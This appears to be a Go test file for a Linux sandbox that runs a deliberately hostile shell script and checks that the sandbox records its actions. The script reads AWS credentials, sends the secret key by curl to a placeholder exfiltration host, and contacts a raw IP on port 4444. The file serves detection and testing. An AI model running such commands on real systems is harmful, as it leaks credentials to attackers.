//go:build linux

package sandbox

import (
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"testing"
	"time"
)

func TestMain(m *testing.M) {
	if len(os.Args) > 1 && os.Args[1] == ChildArg {
		Child()
	}
	os.Exit(m.Run())
}

// TestRun runs a small hostile script in the sandbox. It is skipped where
// namespaces are unavailable (for example Ubuntu runners that restrict
// unprivileged user namespaces).
func TestRun(t *testing.T) {
	if _, err := exec.LookPath("curl"); err != nil {
		t.Skip("curl not installed")
	}
	dir := t.TempDir()
	script := `cat "$HOME/.aws/credentials" >/dev/null
curl -s -m 2 "http://exfil.example.invalid/c?k=$AWS_SECRET_ACCESS_KEY" >/dev/null 2>&1
curl -s -m 2 http://203.0.113.9:4444/ >/dev/null 2>&1
exit 0
`
	if err := os.WriteFile(filepath.Join(dir, "x.sh"), []byte(script), 0o755); err != nil {
		t.Fatal(err)
	}
	self, _ := os.Executable()
	res, err := Run(Options{Dir: dir, Command: []string{"sh", "x.sh"}, Timeout: 30 * time.Second, Self: self, Stdout: io.Discard, Stderr: io.Discard})
	if err != nil {
		t.Skipf("sandbox unavailable here: %v", err)
	}
	var leak, rawIP, open bool
	for _, e := range res.Events {
		switch {
		case e.Kind == "http" && e.Host == "exfil.example.invalid" && e.Leak:
			leak = true
		case e.Kind == "http" && e.Host == "203.0.113.9" && e.Port == 4444:
			rawIP = true
		case e.Kind == "open" && e.Host == "~/.aws/credentials":
			open = true
		}
	}
	if !leak {
		t.Errorf("honeytoken leak not recorded: %+v (notes %v)", res.Events, res.Notes)
	}
	if !rawIP {
		t.Logf("raw IP connection not recorded (notes %v)", res.Notes)
	}
	if res.Strace && !open {
		t.Errorf("credential open not recorded with strace: %+v", res.Events)
	}
}

func TestJoinResumedAndStrace(t *testing.T) {
	lines := joinResumed([]string{
		`10 vfork( <unfinished ...>`,
		`11 execve("/usr/bin/curl", ["curl", "http://x.invalid"], 0x1 /* 3 vars */ <unfinished ...>`,
		`10 <... vfork resumed>)              = 11`,
		`11 <... execve resumed>)             = 0`,
	})
	if len(lines) != 2 || !straceCloneRe.MatchString(lines[0]) || !straceExecRe.MatchString(lines[1]) {
		t.Errorf("joined: %q", lines)
	}
}
